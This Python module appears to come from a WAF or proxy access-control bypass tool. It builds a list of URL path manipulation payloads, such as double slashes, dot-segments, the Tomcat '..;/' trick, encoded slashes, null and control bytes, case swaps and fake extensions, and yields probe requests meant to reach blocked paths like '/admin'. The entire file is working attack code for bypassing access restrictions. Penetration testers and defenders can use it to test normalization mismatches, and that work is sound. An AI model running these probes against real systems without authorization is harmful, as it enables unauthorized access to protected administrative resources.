"""Path / URL manipulation techniques.

Root cause: the guard (proxy/WAF) and the backend normalize the URL path
differently. We send a path the guard reads as "not the blocked one" while the
backend normalizes it back to the blocked resource.

Data-driven: each entry is (label, new_raw_path, stack_hint). `stack_hint` is ""
for broadly-applicable tricks, or a stack name ("java") for tricks that only
work on that backend -- those are skipped once fingerprinting positively
identifies a different, non-Java stack.
"""
from __future__ import annotations

from typing import Iterator

from ..core.models import Request, Probe, TargetProfile


def _variants(seg: str, bare: str) -> list[tuple[str, str, str]]:
    # seg  = full path with leading slash, e.g. "/admin"
    # bare = without leading slash,        e.g. "admin"
    return [
        ("trailing slash",          f"{seg}/",          ""),
        ("leading double slash",    f"//{bare}",         ""),
        ("trailing double slash",   f"{seg}//",          ""),
        ("trailing dot",            f"{seg}/.",          ""),
        ("leading dot-segment",     f"/./{bare}",        ""),
        ("wrapped dot-segments",    f"/./{bare}/./",     ""),
        ("tomcat path-param ..;/",  f"{seg}/..;/",       "java"),
        ("path-param semicolon",    f"{seg};/",          ""),
        ("bare semicolon",          f"{seg};",           ""),
        ("semicolon segment",       f"{seg}/;/",         ""),
        ("encoded trailing slash",  f"{seg}%2f",         ""),
        ("encoded leading slash",   f"/%2f{bare}",       ""),
        ("trailing question",       f"{seg}?",           ""),
        ("trailing hash",           f"{seg}#",           ""),
        ("trailing space",          f"{seg}%20",         ""),
        ("trailing tab",            f"{seg}%09",         ""),
        ("trailing CR",             f"{seg}%0d",         ""),
        ("trailing LF",             f"{seg}%0a",         ""),
        ("trailing null byte",      f"{seg}%00",         ""),
        ("trailing tilde",          f"{seg}~",           ""),
        ("uppercase path",          seg.upper(),         ""),
        ("swapcase path",           seg.swapcase(),      ""),
        ("ext .json",               f"{seg}.json",       ""),
        ("ext .html",               f"{seg}.html",       ""),
        ("ext .css",                f"{seg}.css",        ""),
        ("semicolon ext ;.css",     f"{seg};.css",       "java"),
    ]


def _stack_known_nonjava(profile: TargetProfile) -> bool:
    if not profile.tech:
        return False
    return not any(t in ("java", "tomcat") for t in profile.tech)


class PathTechnique:
    name = "paths"

    def applies_to(self, profile: TargetProfile) -> bool:
        return True

    def generate(self, target: Request, profile: TargetProfile) -> Iterator[Probe]:
        seg = target.raw_path
        bare = seg.lstrip("/")
        skip_java = _stack_known_nonjava(profile)
        for label, new_path, hint in _variants(seg, bare):
            if hint == "java" and skip_java:
                continue
            yield Probe(
                technique=self.name,
                label=f"{label} -> {new_path}",
                request=Request(
                    method=target.method,
                    url=target.url,
                    raw_path=new_path,
                    headers=dict(target.headers),
                    http_version=target.http_version,
                ),
            )
